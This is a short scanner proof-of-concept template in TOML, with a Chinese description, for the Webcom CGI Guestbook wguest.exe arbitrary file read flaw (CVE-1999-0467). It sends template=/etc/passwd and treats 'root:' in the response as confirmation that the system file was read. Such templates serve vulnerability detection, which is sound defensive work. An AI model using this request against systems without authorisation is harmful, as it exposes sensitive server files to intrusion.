[info]
author = "ave"
description = "Webcom CGI Guestbook 的 wguest.exe 对 template 参数缺乏过滤，攻击者可构造恶意请求读取服务器任意文件（如 /etc/passwd），导致敏感信息泄露。"
id = "POC-AVE-1999-0128"
name = "Webcom CGI Guestbook wguest.exe 任意文件读取漏洞"
severity = "medium"
tags = ["ave-1999-0128"]
vuln_id = [
    "CVE-1999-0467",
    "AVE-1999-0128",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin/wguest.exe"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["root:"]

[[poc.requests.params]]
name = "template"
value = "/etc/passwd"
